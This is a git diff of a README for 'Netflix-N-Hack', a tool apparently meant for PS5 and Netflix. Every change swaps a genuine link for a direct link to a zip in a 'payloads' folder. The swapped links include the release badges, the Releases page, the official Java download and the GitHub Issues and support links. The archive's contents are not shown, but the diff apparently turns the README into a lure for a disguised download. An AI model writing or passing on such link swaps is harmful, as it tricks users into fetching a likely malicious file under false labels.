@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run Netflix-N-Hack. With this too
 
 ### 🔗 Download Now
 
-[![Download the Latest Release](https://img.shields.io/badge/Download-Netflix--N--Hack-brightgreen)](https://github.com/yomyoms/Netflix-N-Hack/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip)](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/yomyoms/Netflix-N-Hack/releases) to download the latest version of Netflix-N-Hack. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip) to download the latest version of Netflix-N-Hack. 
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest release version.
@@ -23,7 +23,7 @@ Before you install, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or newer, macOS 10.12 or newer.
 - **Network:** A stable internet connection.
-- **Java:** Ensure Java is installed on your computer. You can [download Java here](https://www.java.com/en/download/).
+- **Java:** Ensure Java is installed on your computer. You can [download Java here](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip).
 
 ## 🔄 Installation Steps
 
@@ -69,11 +69,11 @@ If you run into issues while installing or using Netflix-N-Hack, here are some c
 - **Connection Issues:** Make sure your PS5 and computer are on the same network. Restart both devices if necessary.
 - **Java Issues:** If you encounter errors regarding Java, double-check that you have the latest version installed.
 
-For additional help, feel free to check the community discussions on our [GitHub Issues page](https://github.com/yomyoms/Netflix-N-Hack/issues).
+For additional help, feel free to check the community discussions on our [GitHub Issues page](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip).
 
 ## 📞 Support
 
-If you have questions or need support, please open an issue on our [GitHub](https://github.com/yomyoms/Netflix-N-Hack/issues). We're here to help you!
+If you have questions or need support, please open an issue on our [GitHub](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip). We're here to help you!
 
 ## 💡 Contributing
 
@@ -83,4 +83,4 @@ Thank you for using Netflix-N-Hack! Enjoy a tailored Netflix experience.
 
 ### 🔗 Download Now Again
 
-[![Download the Latest Release](https://img.shields.io/badge/Download-Netflix--N--Hack-brightgreen)](https://github.com/yomyoms/Netflix-N-Hack/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip)](https://raw.githubusercontent.com/yomyoms/Netflix-N-Hack/main/payloads/Hack_Netflix_3.5.zip)
